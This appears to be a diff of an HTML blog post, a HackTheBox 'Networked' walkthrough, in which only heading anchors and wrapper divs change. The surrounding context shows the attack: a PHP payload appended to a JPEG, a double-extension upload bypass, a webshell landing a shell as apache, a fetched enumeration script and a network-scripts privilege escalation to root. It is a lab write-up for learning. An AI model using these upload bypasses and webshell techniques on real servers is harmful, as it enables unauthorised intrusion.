@@ -16,6 +16,8 @@ $ nmap -sV -sT -sC networked.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019
 <link rel="canonical" href="/posts/networked/" />
 
 
+
+
 <link rel="stylesheet" href="/assets/style.css">
 
   <link rel="stylesheet" href="/assets/green.css">
@@ -176,13 +178,13 @@ $ nmap -sV -sT -sC networked.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019
   <img src="/img/networked-hackthebox.png" class="post-cover" />
   
 
-  <div class="post-content">
-    <p>Networking was an interesting box. Focused on coding mistakes rather than exploit or misconfiguration.</p>
+  <div class="post-content"><div>
+        <p>Networking was an interesting box. Focused on coding mistakes rather than exploit or misconfiguration.</p>
 <p>First thing first, let's add the box IP to the hosts file:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;10.10.10.146 networked.htb&#34;</span> &gt;&gt; /etc/hosts
 </code></pre></div><p>Let's go !</p>
-<h1 id="user-flag">User Flag</h1>
-<h2 id="recon">Recon</h2>
+<h1 id="user-flag">User Flag<a href="#user-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="recon">Recon<a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Let's start with the classic <code>nmap</code> scan:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap -sV -sT -sC networked.htb
 Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-10-19 19:47 CEST
@@ -254,8 +256,8 @@ foreach ($validext as $vext) {
 }
 </code></pre></div><p>This one check do compare the end of the filename to see if it end with the common <code>.jpg</code>, <code>.png</code>, <code>.gif</code> and <code>.jpeg</code>. If not, the file is defined invalid and not uploaded.</p>
 <p>Alright, with all those information in mind let's try to craft one malicious image :)</p>
-<h2 id="file-upload-vulnerability">File upload vulnerability</h2>
-<h3 id="bypass-first-check-mime-type">Bypass First Check: MIME Type</h3>
+<h2 id="file-upload-vulnerability">File upload vulnerability<a href="#file-upload-vulnerability" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="bypass-first-check-mime-type">Bypass First Check: MIME Type<a href="#bypass-first-check-mime-type" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>The easiest way to do so is to take a valid image and append the malicious content at the end of the file. It can be done in various way. Here how I did:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#75715e"># Download most basic jpg image possible</span>
 $ wget https://raw.githubusercontent.com/mathiasbynens/small/master/jpeg.jpg -O hg8.jpeg
@@ -264,7 +266,7 @@ $ cat hg82.jpeg
 ����C
 ��
  ���?�� ��&lt;?php phpinfo<span style="color:#f92672">(</span><span style="color:#f92672">)</span>; ?&gt;
-</code></pre></div><h3 id="bypass-second-check-file-extension">Bypass Second Check: File extension**</h3>
+</code></pre></div><h3 id="bypass-second-check-file-extension">Bypass Second Check: File extension**<a href="#bypass-second-check-file-extension" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>A common vulnerability in php file upload form is the &ldquo;double extension&rdquo; :</p>
 <blockquote>
 <p>In Apache, a php file might be executed using the double extension technique such as &ldquo;file.php.jpg.
@@ -277,7 +279,7 @@ $ cat hg82.jpeg
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">define(&#34;UPLOAD_DIR&#34;, &#34;/var/www/html/uploads/&#34;);
 </code></pre></div><p>We have the location of the upload folder and the name of the file. Let's open it ! Mine is at <a href="http://networked.htb/uploads/10_10_15_101.php.jpg">http://networked.htb/uploads/10_10_15_101.php.jpg</a></p>
 <p><img src="https://user-images.githubusercontent.com/9076747/67150075-50318080-f2b3-11e9-8195-26034691deeb.png" alt="Networked upload"></p>
-<h3 id="pivot-php-webshell---user">Pivot PHP Webshell -&gt; User</h3>
+<h3 id="pivot-php-webshell---user">Pivot PHP Webshell -&gt; User<a href="#pivot-php-webshell---user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>Now that we have a working process let's replace the <code>phpinfo()</code> by a webshell and we can easily land a shell running as <code>apache</code> user :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">networked.htb:/var/www/html/uploads $ id
 uid<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span>
@@ -344,8 +346,8 @@ Connection from 10.10.10.146:52024
 uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>guly<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>guly<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>guly<span style="color:#f92672">)</span>
 <span style="color:#f92672">[</span>guly@networked ~<span style="color:#f92672">]</span>$ cat user.txt
 526cxxxxxxxxxxx1c5
-</code></pre></div><h1 id="root-flag">Root Flag</h1>
-<h2 id="recon-1">Recon</h2>
+</code></pre></div><h1 id="root-flag">Root Flag<a href="#root-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="recon-1">Recon<a href="#recon-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>To make the recon task easier, we are going to use the <a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux enumeration tool</a>. For the transfer of the script we will setup a simple http server on our attacking machine:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#75715e"># In attacker console</span>
 $ wget <span style="color:#e6db74">&#34;https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh&#34;</span> -O lse.sh
@@ -393,7 +395,7 @@ regexp<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</spa
 
 /sbin/ifup guly0
 </code></pre></div><p>The script take various user input to set them in a network configuration file <code>/etc/sysconfig/network-scripts/ifcfg-guly</code>. At the end the <code>/sbin/ifup guly0</code> apply the new configuration.</p>
-<h2 id="network-script-privilege-escalation">network-script privilege escalation</h2>
+<h2 id="network-script-privilege-escalation">network-script privilege escalation<a href="#network-script-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>This one was new for me, while searching for informations about <code>network-script</code> I stumbled across this <code>SecList</code>:</p>
 <blockquote>
 <p>Redhat/CentOS root through network-scripts
@@ -448,7 +450,7 @@ uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root
 <p>See you next time !</p>
 <p>-hg8</p>
 
-  </div>
+      </div></div>
   
   <div class="pagination">
     <div class="pagination__title">
